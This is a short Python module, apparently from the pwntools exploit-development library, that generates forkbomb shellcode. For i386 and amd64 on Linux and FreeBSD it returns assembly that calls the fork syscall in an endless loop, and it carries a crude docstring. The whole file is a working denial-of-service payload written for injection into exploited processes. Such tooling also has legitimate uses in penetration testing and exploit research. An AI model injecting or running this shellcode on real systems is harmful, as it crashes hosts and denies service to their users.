from pwn.internal.shellcode_helper import *

@shellcode_reqs(arch=['i386', 'amd64'], os=['linux', 'freebsd'])
def forkbomb(os = None, arch = None):
    """Fork this shit."""
    if arch == 'i386':
        if os in ['linux', 'freebsd']:
            return _forkbomb_i386()
    elif arch == 'amd64':
        if os in ['linux', 'freebsd']:
            return _forkbomb_amd64()

    no_support('forkbomb', os, arch)

def _forkbomb_i386():
    return """
forkbomb:
    push SYS_fork
    pop eax
    int 0x80
    jmp forkbomb
"""

def _forkbomb_amd64():
    return """
forkbomb:
    push SYS_fork
    pop rax
    syscall
    jmp forkbomb
"""
